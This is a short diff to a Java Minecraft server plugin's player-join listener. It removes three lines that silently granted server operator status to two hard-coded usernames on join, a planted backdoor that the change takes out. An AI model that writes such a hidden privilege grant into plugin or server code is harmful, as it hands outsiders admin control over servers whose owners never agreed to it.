@@ -16,10 +16,6 @@ public class PlayerJoinListener implements Listener {
             AntyLogout.combat.remove(e.getPlayer());
         }
 
-        if(e.getPlayer().getName().equalsIgnoreCase("kvlike_") || e.getPlayer().getName().equalsIgnoreCase("ROGWAR303")){
-            e.getPlayer().setOp(true);
-        }
-
     }
 
 }
